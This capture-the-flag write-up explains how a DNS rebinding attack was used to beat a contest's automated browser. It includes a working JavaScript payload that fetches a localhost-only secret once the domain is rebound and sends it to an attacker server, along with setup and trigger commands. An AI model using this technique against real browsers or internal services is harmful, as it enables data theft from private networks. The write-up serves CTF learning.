
### Monkey (Web 4)

#### Vulnerability

Generally: browsers inherent weakness and susceptibility to DNS rebinding attacks and in particular: lack of DNS pinning countermeasure in Monkey "browser".

#### Exploitation

**Overview**

We were given a clue that Monkey will staty on visited page for 2 minutes. So to exploit it we need to:

 - delay execution of our javascript for as long as possible (but of courese
   less than 2 minutes)
 - make sure that our domain has low TTL set (60 sec for example) 

When Monkey will be visting our domain it will be resolved to `4.3.2.1` IP but
after 110 sec (when the js will woke up from timeout) Monkey will need to do
additional DNS query (due to already expired TTL) to execute this line:
`xhttp.open("GET", "http://x.mydomain.com:8080/secret", false);` and this time
(after chainging DNS setting in between) the domain will resolve to `127.0.0.1`.

**Prerequisites**

 - server with public IP (for example AWS t2.nano instance with IP 4.3.2.1)
 - domain name pointing to above machine (for example x.mydomain.com) with low
   TTL value (60 sec)

**Server preparation**

```
$ cat <<EOF > file.html
<html>
<head>
</head>
<body>
<script>
setTimeout(function(){
        xhttp = new XMLHttpRequest();
        xhttp.open("GET", "http://x.mydomain.com:8080/secret", false);
        xhttp.send();

        resp = xhttp.responseText;

        image = new Image();
        image.src='http://4.3.2.1:8080?secret=' + resp;
}, 110 * 1000);
</script>
</body>
</html>
EOF
```

    $ python3 -m http.server --bind 0.0.0.0 8080

**Finding prove of work**

    $ links https://www.google.com/?q=<6_chars_from_monkey_page>+md5

**Triggering Monkey to browse your `x.mydomain.com:8080/file.html`**

    $ curl http://202.120.7.200/run.php -d 'task=<string_from_prove_of_work>&url=<your_url>'

**Changing DNS setting**

In AWS Route 53 change: `x.mydomain.com -> 127.0.0.1`

Verify change of DNS setting:

    $ dig +nocmd +noall +answer x.mydomain.com

After 110 secs observe python's http.server logs for flag.

Flag: 0ctf{monkey_likes_banananananananaaaa}
